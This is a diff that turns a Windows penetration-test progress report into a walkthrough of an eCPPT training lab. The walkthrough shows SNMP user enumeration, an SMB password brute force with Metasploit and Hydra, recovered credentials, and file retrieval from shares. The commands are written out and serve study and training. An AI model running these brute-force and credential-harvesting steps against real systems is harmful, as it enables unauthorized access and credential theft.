@@ -1,88 +1,118 @@
-Server.prod.local Penetration Testing - Progress Report
-Target Overview
+**INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 1 Walkthrough**
 
-    IP: 10.5.31.6
+---
 
-    Hostname: server.prod.local
+**Objective:** Obtain Flag 1 from the target system at `10.2.22.104`.
 
-    OS: Microsoft Windows
+---
 
-    Open Ports & Services:
+### Step 1 — SNMP Enumeration
 
-        135/tcp (msrpc)
+* Tool: `snmpwalk`
+* Community string: `blue`
 
-        139/tcp (netbios-ssn)
+**Command Executed:**
 
-        445/tcp (microsoft-ds - SMB)
+```
+snmpwalk -v2c -c blue 10.2.22.104 1.3.6.1.4.1.77.1.2.25
+```
 
-        1433/tcp (ms-sql-s - Microsoft SQL Server 2016)
+**Result:**
 
-        3389/tcp (ms-wbt-server - RDP)
+* Enumerated valid users:
 
-        Several high ports (49664–49696) open for msrpc
+  * Guest
+  * timothy
+  * ssm-user
+  * Administrator
+  * DefaultAccount
+  * WDAGUtilityAccount
 
-Completed Tasks
+---
 
-    SNMP: UDP 161 port is open|filtered but no response to default community strings (public, private, etc.)
+### Step 2 — SMB Enumeration
 
-    SMB: Access denied when enumerating shares without credentials
+* Tools: `smbclient`, `Metasploit smb_login` module
 
-    MS-SQL: Server version detected, but no credentials yet to connect
+**SMB Null Session Test:**
 
-Next Steps & Notes for Tomorrow
-Enumeration & Credential Bruteforce
+```
+smbclient -L //10.2.22.104 -N
+```
 
-    SMB Enumeration:
+Result: Access Denied
 
-        Once credentials are found, test SMB shares with:
+**SMB Login Brute Force with `timothy` account:**
 
-smbclient -L //10.5.31.6 -U <username>%<password>
+```
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 10.2.22.104
+set SMBUser timothy
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+```
 
-Access shares with:
+**Valid Credentials Found:**
 
-    smbclient //10.5.31.6/<sharename> -U <username>%<password>
+```
+Username: timothy
+Password: jordan
+```
 
-SMB Bruteforce with Hydra:
+---
 
-    Use wordlists of usernames and passwords to brute force SMB authentication:
+### Step 3 — SMB Share Enumeration with Valid Credentials
 
-    hydra -L users.txt -P passwords.txt smb://10.5.31.6 -t 4 -W 5
+```
+smbclient -L //10.2.22.104 -U timothy
+```
 
-MS-SQL Enumeration:
+**Shares Discovered:**
 
-    Attempt to connect using Impacket’s mssqlclient.py:
+* ADMIN\$
+* C\$
+* IPC\$
+* secrets
 
-python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py <username>@10.5.31.6
+---
 
-Test password guessing on MSSQL with Hydra:
+### Step 4 — Accessing `secrets` Share & Retrieving Flag 1
 
-        hydra -L users.txt -P passwords.txt mssql://10.5.31.6 -t 4 -W 5
+```
+smbclient //10.2.22.104/secrets -U timothy
+ls
+get flag1.txt
+```
 
-    SNMP:
+**Flag 1 Retrieved:**
 
-        Keep testing for valid community strings and run snmpwalk when found.
+```
+974a6ba2590c45e8b929fc86f676147e
+```
 
-Wordlists for Credential Guessing (to prepare):
+---
 
-    Usernames (users.txt):
+### Step 5 — Additional Enumeration (Optional but Documented)
 
-administrator
-guest
-mary
-user
-admin
-test
+* Retrieved `mssql_creds.txt` containing credentials:
 
-Passwords (passwords.txt):
+```
+username: timmy
+password: def_32121_@#
+```
 
-    password
-    Password123
-    admin123
-    123456
-    letmein
+---
 
-Bonus
+### Current Status:
 
-    If a shell is gained, test local MS-SQL access via PowerShell:
+✅ Flag 1 obtained via SMB with `timothy:jordan` credentials.
+✅ Additional MSSQL credentials gathered for later exploitation.
 
-Invoke-Sqlcmd -Query "SELECT name FROM sys.databases;" -ServerInstance "localhost" -Username "sa" -Password "<password>"
+---
+
+**Next Step:**
+Begin MSSQL exploitation with `timmy` credentials to escalate privileges or execute commands.
+
+---
+
+*Documented for GitHub Lab Journal — To be continued with MSSQL exploitation and privilege escalation steps.*
